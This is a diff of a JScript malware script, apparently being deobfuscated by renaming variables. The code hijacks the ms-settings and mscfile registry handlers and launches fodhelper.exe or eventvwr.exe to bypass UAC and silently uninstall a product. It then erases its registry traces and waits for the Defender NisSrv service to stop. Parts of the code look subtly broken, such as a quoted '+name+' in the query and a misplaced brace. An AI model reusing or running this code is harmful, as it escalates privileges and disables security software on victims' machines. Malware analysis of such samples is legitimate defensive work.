@@ -1,77 +1,73 @@
 function pmbskuecyftru(name) {
-  var shfebaomwlx = GetObject("winmgmts:").ExecQuery(
-    "SELECT * FROM Win32_Service WHERE Name=+name+"
-  );
-  utlxfzud = new Enumerator(shfebaomwlx);
+  var winmgmts_object = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name=+name+");
+  utlxfzud = new Enumerator(winmgmts_object);
   bqijutotpzpmc = utlxfzud.item();
-  var htugfg = "";
+  var process_state = "";
   try {
-    htugfg = bqijutotpzpmc.State;
+    process_state = bqijutotpzpmc.State;
   } catch (e) {}
-  if (htugfg == "Running") {
-    return true;
-  } else {
-    return false;
-  }
-  tdlfiqbhtqlk = "NisSrv";
-  var sxwvah = WScript.CreateObject("shell.application");
-  var siwbezkij = new ActiveXObject("WScript.Shell");
-  var fufajgarmx = GetObject("winmgmts:\\\\.\\root\\CIMV2");
-  var lsiicx = fufajgarmx.ExecQuery(
+  return (process_state == "Running") ? true : false;
+  
+}
+  NisSrv_lbl = "NisSrv";
+  var wScriptShell_application = WScript.CreateObject("shell.application");
+  var activeXObj_shell = new ActiveXObject("WScript.Shell");
+  var get_obj_winmgmtsCIMV2 = GetObject("winmgmts:\\\\.\\root\\CIMV2");
+  var lsiicx = get_obj_winmgmtsCIMV2.ExecQuery(
     "SELECT * FROM Win32_OperatingSystem",
     "WQL",
     48
   );
   var zynhqkeg = new Enumerator(lsiicx);
-  var iaibbfhyncgmgt = zynhqkeg.item();
-  var vjcrmmpy = iaibbfhyncgmgt.SystemDirectory;
-  var nimlctvre = iaibbfhyncgmgt.Version;
-  var arr = nimlctvre.split(".");
+  var enum_item = zynhqkeg.item();
+  var sysDirObj = enum_item.SystemDirectory;
+  var versionObj = enum_item.Version;
+  var arr = versionObj.split(".");
   if (arr[0] == "10") {
-    siwbezkij.RegWrite(
+    activeXObj_shell.RegWrite(
       "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
       "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
       "REG_SZ"
     );
-    siwbezkij.RegWrite(
+    activeXObj_shell.RegWrite(
       "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
       "",
       "REG_SZ"
     );
-    sxwvah.ShellExecute(
+    wScriptShell_application.ShellExecute(
       "explorer.exe",
-      "+vjcrmmpy+fodhelper.exe",
+      +sysDirObj+"fodhelper.exe",
       "",
       "open",
       0
     );
     WScript.sleep(1e4);
-    siwbezkij.RegDelete(
+    activeXObj_shell.RegDelete(
       "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
     );
   } else {
     if (arr[0] == "6") {
-      siwbezkij.RegWrite(
+      activeXObj_shell.RegWrite(
         "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
         "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
         "REG_SZ"
       );
-      sxwvah.ShellExecute(
+      wScriptShell_application.ShellExecute(
         "explorer.exe",
-        "+vjcrmmpy+\\eventvwr.exe",
+        +sysDirObj+"\\eventvwr.exe",
         "",
         "open",
         0
       );
       WScript.sleep(1e4);
-      siwbezkij.RegDelete(
+      activeXObj_shell.RegDelete(
         "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
       );
     }
   }
   var iii = 0;
   while (true) {
-    if (pmbskuecyftru(tdlfiqbhtqlk)) {
+    if (pmbskuecyftru(NisSrv_lbl)) {
       WScript.sleep(100);
     } else {
       break;
